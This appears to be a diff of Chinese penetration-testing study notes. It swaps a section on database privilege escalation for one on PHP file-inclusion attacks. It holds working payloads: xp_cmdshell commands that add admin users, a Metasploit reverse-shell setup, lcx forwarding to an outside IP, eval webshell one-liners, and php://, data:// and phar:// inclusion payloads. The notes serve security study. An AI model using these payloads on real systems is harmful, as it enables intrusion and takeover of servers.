-<p>形如2.6.18-194，可以直接执行；形如2.6.18.c，需要编译后运行，提权。当然也有少部分exp是按照发行版版本命名。</p>
-<p>使用exp</p>
-<p>一般情况下linux的本地提权要用nc反弹出来，因为Linux下提升权限后得到的是交互式shell，需反弹才能进行下一步命令的执行。<br>我们可以使用uname -a命令或者cat /proc/version，来判断系统的内核情况等等，然后使用相对应的exp进行提权。<br>注：</p>
-<p>提权过程中需要为你的提权exp赋权，chmod。<br>linux服务器很多情况下管理员会设置目录权限，我们无法修改，但是一般/tmp/目录不会被设置权限，这和windows下的tmp和回收站是一个道理，所以我们可以将exp存放到/tmp目录下。</p>
-<h4 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h4><p>数据库提权是指：通过执行数据库语句、数据库函数等方式提升服务器用户的权限。</p>
-<p>首先我们要先有能力登入数据库，所以通常我们拿到webshell之后要去网站目录去找数据库连接文件，常在形如xxx.conf或conf.xxx文件中。</p>
-<h5 id="MySQL数据库提权"><a href="#MySQL数据库提权" class="headerlink" title="MySQL数据库提权"></a>MySQL数据库提权</h5><p>MySQL数据库一般是使用udf（用户自定义函数）提权或mof（托管对象格式）提权。</p>
+<p>Linux系统</p>
 <ul>
-<li>udf提权（用户自定义函数）</li>
+<li>/etc/passwd // 账户信息</li>
+<li>/etc/shadow // 账户密码文件</li>
+<li>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</li>
+<li>/etc/my.conf // mysql 配置文件</li>
 </ul>
-<p><strong>条件：</strong><br>1、系统版本（Windows2000，XP,Win2003)；<br>2、拥有MYSQL的某个账号，且该账号具有对msql的insert与delete权限；<br>3、具有root账号密码。</p>
-<p><strong>使用方法：</strong><br>1、获取当前mysql的一个数据库连接信息，通常包含地址、端口、账号、密码、库名等五个信息。<br>2、把udf专用的webshell传到服务器上，访问并进行数据库连接。<br>3、连接成功后，导出DLL文件。</p>
-<p><strong>注：</strong></p>
+<h5 id="二、session文件包含漏洞"><a href="#二、session文件包含漏洞" class="headerlink" title="二、session文件包含漏洞"></a>二、session文件包含漏洞</h5><p><strong>利用条件</strong></p>
+<p>1.我们可以通过phpinfo的信息泄露获取到session的存储位置</p>
+<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123104312.png)</p>
+<p>2.或者通过猜测默认的session存放位置</p>
+<p>linux下的默认存储目录为/var/lib/php/session</p>
+<p><strong>利用过程</strong></p>
+<p>我们可以先使用文件包含上传恶意代码，比如</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span><span class="token punctuation">;</span>
+
+<span class="token delimiter">?></span></code></pre>
+<p>此php会将获取到的GET型ctfs变量的值存入到session中。如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码。<br>我们构造：</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123104221.png" style="zoom:80%;" />
+
+<p>我们发现在本地session所在目录下存储了session的值</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123105708.png" style="zoom:80%;" />
+
+<p>攻击者通过phpinfo()信息泄露或者猜测获取到session存放的目录位置，然后通过浏览器自带开发者模式获取到文件名称：sess_lotipf7ccidsbsrltdau35rb65</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123103711.png" style="zoom:150%;" />
+
+<p>构造本地文件包含 ：<strong>file.php?D:\phpStudy\PHPTutorial\tmp\tmp\sess_lotipf7ccidsbsrltdau35rb65</strong></p>
+<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123104500.png)</p>
+<h5 id="三、有限制本地文件包含漏洞绕过"><a href="#三、有限制本地文件包含漏洞绕过" class="headerlink" title="三、有限制本地文件包含漏洞绕过"></a>三、有限制本地文件包含漏洞绕过</h5><p><strong>%00截断</strong></p>
+<p>条件：magic_quotes_gpc=Off  并且php版本&lt;5.3.4</p>
+<p><strong>测试代码</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>当我们直接包含本地的test.txt时</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123113838.png" style="zoom:67%;" />
+
+<p>我们在test.txt加上%00进行截断</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123113851.png" style="zoom:67%;" />
+
+
+
+
+
+
+
+<p><strong>四、路径长度限制</strong></p>
+<p>条件：windows OS,点号需要长于256；linuxOS 长于4096</p>
+<pre><code>windows下目录最大长度为256字节，超出的部分会被丢弃；
+linux下目录最大长度为4096字节，超出的部分会被丢弃。</code></pre><p>测试代码：</p>
+<pre><code>&lt;?php
+   $filename =$_GET[&#39;filename&#39;];
+   include($filename . &quot;.html&quot;);
+   ?&gt;</code></pre><h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
+<pre><code>allow_url_fopen = On（是否允许打开远程文件）
+allow_url_include = On（是否允许include/require远程文件）</code></pre><p>示例：</p>
+<p>测试代码：</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&#39;filename&#39;];
+    include($filename);
+?&gt;</code></pre><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203191630.png)</p>
+<h4 id="PHP伪协议在文件包含中的应用"><a href="#PHP伪协议在文件包含中的应用" class="headerlink" title="PHP伪协议在文件包含中的应用"></a>PHP伪协议在文件包含中的应用</h4><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。除了这些封装协议、还能通过stream_wrapper_register() 来注册自定义的封装协议。</p>
+<p><strong>php伪协议类别</strong></p>
 <ul>
-<li>Mysql&lt;5.0，导出路径随意;</li>
-<li>5.0&lt;=mysql&lt;5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“No paths allowed for shared library”错误；</li>
-<li>mysql&gt;5.1，需要导出dll到插件路径，例如：D:\Program Files\MySQL\MySQL Server 5.1.3\lib\plugin<br>若mysql&gt;=5.0，语句中的DLL不允许带全路径，如果在第二步中已将DLL导出到系统目录，那么你就可以省略路径而使命令正常执行，否则将会看到”Can’t open shared library“错误。</li>
-<li>如果提示“Function ‘cmdshell’ already exists”，则输入下列语句可以解决：drop function cmdshell;</li>
+<li>file://    访问本地文件系统</li>
+<li>http://   访问HTTP（s)网址</li>
+<li>ftp://     访问FTP(s) URLs</li>
+<li>php://      访问各个输入/输出流</li>
+<li>zlib://     压缩流</li>
+<li>data://  数据</li>
 </ul>
-<p><strong>使用SQL语句创建自定义函数。语法如下：</strong></p>
-<p><code>Create Function 函数名 returns string soname &#39;导出的DLL路径&#39;;
-eg: Create Function cmdshell returns string soname &#39;udf.dll&#39;;</code></p>
-<p><strong>功能函数说明：</strong></p>
-<ul>
-<li>cmdshell 执行cmd;</li>
-<li>downloader 下载者,到网上下载指定文件并保存到指定目录;</li>
-<li>open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</li>
-<li>backshell 反弹Shell;</li>
-<li>ProcessView 枚举系统进程;</li>
-<li>KillProcess 终止指定进程;</li>
-<li>regread 读注册表;</li>
-<li>regwrite 写注册表;</li>
-<li>shut 关机,注销,重启;</li>
-<li>about 说明与帮助函数;</li>
-</ul>
-<p><strong>创建函数成功后，就可以通过sql语句调用它了。</strong></p>
-<p>语法如下：<br>select 创建的函数名 (‘参数列表’);<br>eg: select cmdshell(“net user nsfocus Nsf0cus /add”)；创建一个用户nsfocus，密码为Nsf0cus</p>
-<p><strong>函数使用完后，我们需要把之前生成的DLL和创建的函数删除掉，但要注意次序，必须先删除函数再删除DLL。</strong></p>
-<p>删除函数的语法如下：<br>drop function 创建的函数名;<br>eg: drop function cmdshell;</p>
-<h5 id="整体思路："><a href="#整体思路：" class="headerlink" title="整体思路："></a>整体思路：</h5><ul>
-<li>导出C:\windows\udf.dll</li>
-<li>Create Function cmdshell returns string soname ‘udf.dll’;</li>
-<li>select cmdshell(‘whoami’)</li>
-<li>drop function cmdshell</li>
-</ul>
-<h5 id="Mof提权（托管对象格式）"><a href="#Mof提权（托管对象格式）" class="headerlink" title="Mof提权（托管对象格式）"></a>Mof提权（托管对象格式）</h5><p>提权c:/windows/system32/wbem/mof/</p>
-<pre><code>- use exploit/windows/mysql/mysql_mof
-- set password xxx
-- set username xxx
-- set rhost xxx
-- set rport xxx
-- set payload windows/shell_reverse_tcp
-- set lhost xxx
-- set lport xxx
-- exploit</code></pre><h5 id="Mssql数据库提权"><a href="#Mssql数据库提权" class="headerlink" title="Mssql数据库提权"></a>Mssql数据库提权</h5><p><img src="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
-<p><strong>在SA权限下</strong></p>
-<p>1.存在xp_cmdshell时<br>使用xp_cmdshell执行命令添加用户，当出现错误可以恢复和开启xp_cmdshell</p>
-<p>2.xp_cmdshell无法使用时<br>    使用sp_OACreate执行命令，同样当出现错误可以恢复和开启</p>
-<ol start="3">
-<li><p>当执行命令无法使用时可以用沙盒提权 (使用xp_regwrite和openrowset)</p>
+<p><strong>php://filter(本地磁盘文件进行读取）</strong></p>
+<p>元封装器，设计用于“数据流打开“时的”筛选过滤“应用，对本地磁盘文件进行读写。</p>
+<p>用法：?filename=php://filter/convert.base64-encode/resource=xxx.php</p>
+<p>条件：需要开启allow_url_fopen</p>
+<p>示例：</p>
+<p>本地新建file.php</p>
+<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200128205700.png)</p>
+<p>我们使用php伪协议在本地读取shell.php文件中的内容</p>
+<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200128205953.png)</p>
+<p>对得到的Base64进行解码即可。</p>
+<p><strong>file://伪协议（读取文件内容）</strong></p>
+<p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
+<p>示例：</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203184038.png" style="zoom:67%;" />
+
+
+
+<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
+<p>用法：?file=php://input 数据利用POST传过去。</p>
+<p>利用条件：</p>
+<p>allow_url_include = On。<br> 对allow_url_fopen不做要求</p>
+<pre><code>&lt;?phpinfo();?&gt;
+&lt;?php system(&#39;whoami&#39;);?&gt;
+&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST[&#39;caidao&#39;];?&gt;)&quot;)?&gt;</code></pre><p>包含姿势：</p>
+<pre><code>index.php
+?file=php://input
+
+POST:
+&lt;? phpinfo();?&gt;</code></pre><h5 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h5><p>​      碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>测试代码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span>
+<span class="token delimiter">?></span></code></pre>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203182852.png" style="zoom:67%;" />
+
+<h5 id="php-input-命令执行"><a href="#php-input-命令执行" class="headerlink" title="php://input(命令执行)"></a>php://input(命令执行)</h5><p>测试代码：</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&#39;filename&#39;];
+    include($filename);
+?&gt;</code></pre><p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p>
+<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203183726.png)</p>
+<h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p>
+<p>利用条件：</p>
+<p>php版本大于等于php5.2<br> allow_url_fopen = On<br> allow_url_include = On</p>
+<p>示例1：</p>
+<pre><code>/index2.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-5449b681b9c47ddb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
+<p>执行命令：</p>
+<pre><code>index2.php?file=data:text/plain;&lt;?php system(&quot;whoami&quot;);?&gt;</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-0fce621191e72481.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/885" alt="img"></p>
+<p>示例2：</p>
+<pre><code>/index2.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<?php phpinfo() ?></p>
+<p><strong>包含session</strong></p>
+<p>利用条件：session文件路径已知，且其中内容部分可控。</p>
+<p>思路：结合phpmyadmin,因为phpmyadmin每次登录时，会带上session。</p>
+<p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-dd5195fec4210a53.png" alt=""></p>
+<p>session文件的绝对路径可在phpinfo中查看，session.save_path</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-1e7dd8fd1a028711.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/608" alt="img"></p>
+<p>常见的php-session存放位置还有这几个：</p>
+<pre class=" language-csharp"><code class="language-csharp"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID</code></pre>
+<p>使用以下命令可查看到session文件中的登录信息</p>
+<pre class=" language-csharp"><code class="language-csharp">strings <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php5<span class="token operator">/</span>sess_258c1be1b00d080bddc58d2896460542facb6f1f <span class="token operator">|</span> grep root</code></pre>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-940bb1d740bd0d47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/723" alt="img"></p>
+<p>登录phpmyadmin时，用户名输入一句话木马，再包含session文件，可getshell</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-c833b1fd110b6170.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-5304d206d0b1fcc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/729" alt="img"></p>
+<p>使用菜刀连接<br> <a href="http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c" target="_blank" rel="noopener">http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c</a><br> 在浏览器里有你的cookie所以你可以直接去访问对应的文件包含页面，用菜刀的话是没有cookie的所以你没有办法去访问文件包含页面也就是fi那个页面。所以说会自动跳转到登录页面，显示200ok</p>
+<p>加上cookie之后在重新连接，成功连接</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-44a9d0f1054d26b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/790" alt="img"></p>
+<h5 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h5><ul>
+<li><p>利用条件：php版本大于等于php5.3.0</p>
 </li>
-<li><p>当只有xp_regwrite可用时可以劫持粘滞键（sethc.exe)<br>使用xp_regwrite修改注册表</p>
+<li><p>这个参数就是php解压缩包的一个函数，不管后缀是什么，都会被当做压缩包来解压。</p>
+<p>用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php </p>
+<p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p>
 </li>
-</ol>
-<p><strong>DBA权限下</strong></p>
-<ol>
-<li>备份到网站目录</li>
-<li>通过备份文件到启动项提权</li>
-</ol>
-<h5 id="SA口令获取方法"><a href="#SA口令获取方法" class="headerlink" title="SA口令获取方法"></a>SA口令获取方法</h5><ul>
-<li><strong>Webshell或源码获取</strong></li>
-</ul>
-<p>一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</p>
-<pre><code>conn.aspx
-config.aspx
-config.php
-web.config
-.........
-
-一般格式如：
-
-server=localhost;
-UID=sa;
-PWD=shadowflow</code></pre><ul>
-<li><strong>源代码泄露</strong></li>
-</ul>
-<p>网站源码泄露情况主要以程序员上传代码到git等开源平台或更新代码时未删除备份文件(.svn、.git、.bak），以及运维人员打包源代码到网站服务器(<a href="http://www.rar/" target="_blank" rel="noopener">www.rar</a>等）。</p>
-<ul>
-<li><strong>嗅探</strong></li>
-</ul>
-<p>在局域网中使用cain等工具进行arp嗅探的时候可以抓取到1433端口的数据库明文登录密码</p>
-<ul>
-<li><strong>口令暴力破解</strong></li>
-</ul>
-<p>利用mssql暴力破解工具对mssql进行暴力破解，一旦成功将获得sa相应权限</p>
-<p><strong>常用SQL Server提权语句</strong></p>
-<pre><code>查看数据库版本：select @@version
-
-查看数据库系统参数：exec master..xp_msver;
-
-查看用户所属角色信息：sp_helpsrvrolemember
-
-查看当前数据库：select db_name()
-
-显示机器上的驱动器：xp_availablemedia
-
-查看当前账户权限
-
-select IS_SRVROLEMEMBER(&#39;sysadmin&#39;) #判断是否为sa权限
-
-类似serveradmin,setupadmin,securityadmin,diskadmin,bulkadmin
-
-select IS_MEMBER(&#39;db_owner&#39;) #判断是否为dbo权限
-
-添加用户
-
-exec master.dbo.sp_addlogin test,password #添加用户
-
-exec master.dbo.sp_addsrvrolemember test,sysadmin #加权限
-
-启动停止服务
-
-exec master..xp_servicecontrol &#39;stop&#39;,&#39;test&#39;
-
-exec master..xp_servicecontrol &#39;start&#39;,&#39;test&#39;
-
-检查功能
-
-SELECT count(*）FROM master.dbo.sysobjects WHERE name=&#39;xp_cmdshell&#39;
-
-xp_cmdshell, xpregread,sp_makewebtask,xp_subdirs,xp_dirtree, sp_addextendedproc
-</code></pre><p><strong>xp_cmdshell</strong></p>
-<pre><code>1、开启xp_cmdshell存储过程
-
-exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;
-exec sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;
-
-2、关闭xp_cmdshell存储过程
-
-exec sp_configure &#39;show advanced options&#39;, 1, RECONFIGURE;
-exec sp_configure &#39;xp_cmdshell&#39;,0;RECONFIGURE;
-
-3、xp_cmdshell执行命令
-
-exec master..xp_cmdshell &#39;ver&#39;
-exec master.dbo.xp_cmdshell &#39;net localgroup administrators test /add&#39;
-
-4、恢复xp_cmdshell
-
-exec sp_dropextendedproc &#39;xp_cmdshell&#39;
-
-dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll) OR dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;d:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&quot;);EXEC sp_configure &#39;show advanced options&#39;, 0 --
-</code></pre><p><strong>sp_OACreate</strong></p>
-<pre><code>1、开启sp_OACreate
-exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;
-exec sp_configure &#39;Ola Automation Procedures&#39; , 1;RECONFIGURE;
-
-2、关闭sp_OACreate
-exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;
-exec sp_configure &#39;Ole Automation Procedures&#39;,0;RECONFIGURE;
-
-3、禁用advanced options
-EXEC sp_configure &#39;show advanced options&#39;,0;GO RECONFIGURE;
-
-4、sp_OACreate执行命令
-
-DECLARE @js int
-EXEC sp_OACreate &#39;ScriptControl&#39;,@js OUT
-EXEC sp_OASetProperty @js,&#39;Language&#39;,&#39;JavaScript&#39;
-ActiveXObject(&quot;Shell.Users&quot;);z=o.create(&quot;user&quot;);z.changePassword(&quot;pass&quot;,&quot;&quot;);z.setting(&quot;AccountType&quot;)=3;&#39;
-
-5、sp_OACreate移动文件
-declare @aa int
-exec sp_oacreate &#39;scripting.filesystemobject&#39; @aa out
-exec sp_oamethod @aa, &#39;moveFile&#39;,null,&#39;c:\temp\ipmi.log&#39;,&#39;c:\temp\ipmi1.log&#39;;
-
-6、sp_OACreate复制文件
-
-declare @o int
-
-exec sp_oacreate &#39;scripting.filesystemobject&#39;, @o out
-
-exec sp_oamethod @o,&#39;copyfile&#39;,null,&#39;c:\windows\explorer.exe&#39;,&#39;c:\windows\system32\sethc.exe&#39;;
-
-7、sp_OACreate删除文件
-
-DECLARE @Result int
-
-DECLARE @FSO_Token int
-
-EXEC @Result = sp_OACreate &#39;Scripting.FileSystemObject&#39;, @FSO_Token OUTPUT
-
-EXEC @Result = sp_OAMethod @FSO_Token, &#39;DeleteFile&#39;,NULL,&#39;c:\Documents and Settings\All Users\ [开始] 菜单\程序\启动\user.bat&#39;
-
-EXEC @Result = sp_OADestrop @FSO_Token
-
-8、wscript.shell执行命令
-
-9、Shell.Application执行命令
-
-10、sp_oacreate 替换粘贴键
-</code></pre><p><strong>沙盒执行命令</strong></p>
-<p>openrowset开启</p>
-<p>openrowset关闭</p>
-<p>沙盒执行命令</p>
-<p><strong>注册表篡改</strong></p>
-<p>注册表劫持粘贴键</p>
-<h4 id="系统配置不当提权"><a href="#系统配置不当提权" class="headerlink" title="系统配置不当提权"></a>系统配置不当提权</h4><p>利用配置不当提权</p>
-<ul>
-<li>前提：已经成功渗透进目标系统；</li>
-<li>相比利用漏洞提权，是更常用的方法；</li>
-<li>在大部分企业中，会将系统的漏洞即时进行补丁更新，难以通过系统自身我的漏洞进行入侵；</li>
-<li>可以查找系统中以system权限启动的服务或应用，可以尝试将其替换或者反弹shell的方式提权；</li>
-<li>可以查找NTFS权限允许users修改删除的应用，利用配置不当进行提权；</li>
-<li>代码中是否有过滤参数的操作等都可以加以利用，进行提取</li>
-</ul>
-<h4 id="权限继承类提权"><a href="#权限继承类提权" class="headerlink" title="权限继承类提权"></a>权限继承类提权</h4><p><strong>开机启动项提权？</strong><br>windows开机时候都会有一些开机启动的程序，那时候启动的程序权限都是system，因为是system把他们启动的，利用这点，我们可以将自动化脚本写入启动项，达到提权的目的。</p>
-<h4 id="第三方软件-服务提权"><a href="#第三方软件-服务提权" class="headerlink" title="第三方软件/服务提权"></a>第三方软件/服务提权</h4><h4 id="WebServer漏洞提权"><a href="#WebServer漏洞提权" class="headerlink" title="WebServer漏洞提权"></a>WebServer漏洞提权</h4><h4 id="提权中常见的问题"><a href="#提权中常见的问题" class="headerlink" title="提权中常见的问题"></a>提权中常见的问题</h4><p>cmd无法执行</p>
-<ul>
-<li><p>cmd被删除</p>
-<ul>
-<li>绕过思路：找可读可写目录，上传cmd.exe</li>
-</ul>
-</li>
-<li><p>cmd被降权</p>
-<ul>
-<li>绕过思路：找可读可写目录，上传cmd.exe</li>
-</ul>
-</li>
-<li><p>组件被删除</p>
-<ul>
-<li>切换组件</li>
-</ul>
-</li>
-<li><p>防护软件拦截</p>
-<ul>
-<li>很难绕过</li>
-</ul>
-</li>
-<li><p>3389无法连接</p>
-</li>
-<li><p>端口被修改</p>
-<ul>
-<li>找端口（1-65535），使用端口扫描工具、注册表读取、查询PID</li>
-</ul>
-</li>
-<li><p>端口被关闭</p>
-<ul>
-<li>上传3389打开工具到可读可写目录，需要先提权，调用执行exe工具</li>
-</ul>
-</li>
-<li><p>内网环境</p>
-<ul>
-<li>端口转发：<ol>
-<li>外网服务器：lcx.exe -listen 1234 4321 (监听1234端口的流量并将其转发至本地4321端口)</li>
-<li>内网肉鸡：lcx.exe -slave 121.43.99.73 1234 192.168.1.106 1111 (将本地192.168.1.106的1111端口流量转发至121.43.99.73的1234端口上)</li>
-<li>外网 连接本地端口4321 即代表连接肉鸡的1111端口</li>
-</ol>
+<li><p>姿势：假设有个文件phpinfo.txt，其内容为<?php phpinfo(); ?>，打包成zip压缩包，如下：</p>
 </li>
 </ul>
+<p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-041eece378dca1e4.png" alt=""></p>
+<p>指定绝对路径：</p>
+<pre><code>index2.php?file=phar://C:\phpStudy\WWW\FileInclusion\phpinfo.zip\phpinfo.txt</code></pre><p>或者利用相对路径（这里phpinfo.zip就在当前目录下）</p>
+<pre><code>index2.php?file=phar://phpinfo.zip/phpinfo.txt</code></pre><p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-489da319d283d845.png" alt=""></p>
+<h5 id="zip：-伪协议"><a href="#zip：-伪协议" class="headerlink" title="zip：//伪协议"></a>zip：//伪协议</h5><ul>
+<li><p>php版本大于等于php5.3.0</p>
 </li>
-<li><p>防护软件拦截</p>
+<li><p>zip伪协议和phar协议类似，但是用法不一样。</p>
+</li>
+<li><p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</p>
+</li>
+<li><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
+</li>
+</ul>
+<pre><code>index2.php?file=zip://C:\phpStudy\WWW\FileInclusion\phpinfo.zip%23phpinfo.txt</code></pre><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p>
 <ul>
-<li>很困难</li>
+<li>1.日志的物理存放路径</li>
+<li>2.存在文件包含漏洞</li>
 </ul>
-</li>
-</ul>
-<h3 id="提权辅助工具"><a href="#提权辅助工具" class="headerlink" title="提权辅助工具"></a>提权辅助工具</h3><h5 id="1-Linux提权辅助工具"><a href="#1-Linux提权辅助工具" class="headerlink" title="1.Linux提权辅助工具"></a>1.Linux提权辅助工具</h5><p>Linux_Exploit_Suggester是一款根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p>
-<p>github项目地址：</p>
-<pre><code>https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</code></pre><p> 用法示例：</p>
-<pre><code>$ perl ./Linux_Exploit_Suggester.pl -k 2.6.28</code></pre><h5 id="2-Windows提权辅助工具"><a href="#2-Windows提权辅助工具" class="headerlink" title="2.Windows提权辅助工具"></a>2.Windows提权辅助工具</h5><p>Windows-Exploit-Suggester是受Linux_Exploit_Suggester的启发而开发的一款提权辅助工具，用python开发而成，通过比对systeminfo生成的文件，从而发现系统是否存在未修复漏洞。</p>
-<p>github项目地址：</p>
-<pre><code>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</code></pre><p>用法示例：</p>
-<pre><code>#查看系统可能存在的漏洞
